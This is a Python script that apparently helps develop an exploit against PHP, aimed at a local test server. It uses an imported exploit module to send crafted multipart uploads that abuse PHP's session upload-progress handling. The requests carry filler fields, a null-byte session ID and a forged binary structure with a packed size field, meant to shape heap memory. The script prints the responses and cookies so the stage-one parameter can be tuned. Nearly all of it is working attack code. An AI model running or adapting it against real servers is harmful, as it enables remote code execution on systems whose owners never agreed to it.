#!/usr/bin/env python3
"""Probe 8.5.11 stage-1 responses: dump headers + cookie for a couple of stage1_n values."""
import sys
import time
import struct

sys.path.insert(0, r"C:\Users\likat\p2s52704")
from exploit import Target, Exploit, build_multipart, parse_cookie, SID

URL = "http://127.0.0.1:18114/index.php"
t = Target(URL, timeout=60.0, verbose=False)

for n in (841, 860):
    ex = Exploit(t, "id", htdata_offset=0x690d8, profile="bookworm")
    ex.stage1_n = n
    parts = [{"name": f"p{i:04d}", "data": b"x"} for i in range(1001)]
    parts += [{"name": "PHPSESSID", "data": b"\x00"},
              {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
              ex._file_part(), ex._big_field()]
    rA = t.post(build_multipart(parts, b"S"*17), b"S"*17, read_cap=9<<20)
    time.sleep(0.2)
    parts = [{"name": "PHPSESSID", "data": SID},
             {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"}]
    for i in range(n):
        val = (f"v{i:04d}" + "x"*44)[:48]
        parts.append({"name": str(1000+i), "data": val.encode()})
    forge = bytearray(b"A"*79); struct.pack_into("<Q", forge, 0x10, 0x1000); forge[0x18] = ord("L")
    parts.append({"name": "1999", "data": bytes(forge)})
    rB = t.post(build_multipart(parts, b"B"*10), b"B"*10, read_cap=9<<20)
    head, _, body = rB.partition(b"\r\n\r\n")
    print(f"=== stage1_n={n} ===")
    print(f"respA len={len(rA)}")
    print("respB headers:")
    print(head.decode("latin1","replace")[:900])
    print("respB body (first 400):")
    print(body[:400].decode("latin1","replace"))
    cookie = parse_cookie(rB)
    print(f"cookie len={len(cookie)}")
    print()
